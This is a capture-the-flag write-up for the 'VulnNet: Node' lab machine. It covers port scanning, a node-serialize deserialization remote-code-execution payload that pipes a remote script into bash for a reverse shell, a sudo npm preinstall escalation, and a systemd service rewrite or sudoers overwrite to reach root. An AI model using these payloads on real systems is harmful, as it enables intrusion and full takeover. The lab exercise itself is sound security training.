## VulnNet: Node

# Enumeration
```
# Nmap 7.91 scan initiated Mon Apr 26 14:31:28 2021 as: nmap -sCV -oN nmap/initial -vvv -p 8080 10.10.115.175
Nmap scan report for 10.10.115.175
Host is up, received timestamp-reply ttl 61 (0.15s latency).
Scanned at 2021-04-26 14:31:29 PDT for 12s

PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 61 Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 26 14:31:41 2021 -- 1 IP address (1 host up) scanned in 13.26 seconds
```

Looks like a web server using Node.js so lets check it out and look for vulnerabilities.

# Web Server Port 8080
Initially nothing of interest seems to be present.
We have some possible admins or users
Tilo Mitra
Eric Ferraiuolo
Reid Burke
Andrew Wooldridge
This may become useful as the only link we can find on the page is to /login which requires and email address and password combination. 
At this point we examine our storage and notice that the site is storing a cookie even though we have not logged in at all.
```
eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D

```
is the value of our cookie and if we remove the url-encoding is clearly a base64 string so we decode it and find the following json structure 
```
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Lets go ahead and format a new json structure and see if we can bypass the login page with the following,
```
{"username":"Admin","isAdmin":true,"encoding": "utf-8"}
```

unfortunately this doesn't allow us to bypass the login page, but it must be used somehow so let's open up burpsuite and play around. Submitting it doesn't give much a response, however if we misformat/delete half of the cookie value we get an interesting error
```
SyntaxError: Unexpected token  in JSON at position 0<br> 
&nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> 
&nbsp; &nbsp;at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)<br> 
&nbsp; &nbsp;at /home/www/VulnNet-Node/server.js:16:24<br> 
&nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> 
&nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)<br> 
&nbsp; &nbsp;at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)<br> 
&nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> 
&nbsp; &nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)<br> 
&nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
```

It seems like it is using the unserialize function so perhaps we can abuse this in some way.
Searching for node js deserialization exploits yielded the following article, https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

so lets use this format to craft a payload that will curl a shell script off my system and then send me a reverse shell.
```
shell.sh
bash -i >& /dev/tcp/IP/PORT 0>&1
```

and our payload to get this
```
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl IP:PORT/shell.sh | bash ', function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}
```

we convert this to base64 and send it and sure enough we get a reverse shell as the www user

# Initial Foothold
sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
looks like we can use npm as serv-manage user and leverage the following sudo exploit
```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

we can write in /dev/shm so lets do the following
```
www@vulnnet-node:/dev/shm$ mkdir temp
www@vulnnet-node:/dev/shm$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > temp/package.json
www@vulnnet-node:/dev/shm$ sudo -u serv-manage /usr/bin/npm -C /dev/shm/temp/ --unsafe-perm i
```
sure enough we get a shell as serv-manage and can find the user flag in it's home directory

# Root Escalation
```
sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

Looks like we can run quite a few things as root to interact with the file vulnnet-auto.timer so let take a look at it
```
serv-manage@vulnnet-node:~$ locate vulnnet-auto.timer
locate vulnnet-auto.timer
/etc/systemd/system/vulnnet-auto.timer
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

looks like it opens the following file
```
cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c "curl IP:PORT/shell.sh | bash"

[Install]
WantedBy=multi-user.target
```

We can read and write to both of these files so we can modify this .service file to instead of executing /bin/df instead send us a reverse shell using the same shell file from earlier for example. We could aslso easily do things such as edit the sudoers file to allow our user to execute all commands as root with a payload such as the following
```
ExecStart=/bin/bash -c 'echo "serv-manage ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
```

Using whatever method we end up with a shell as the root user and can find the flag in the root directory.
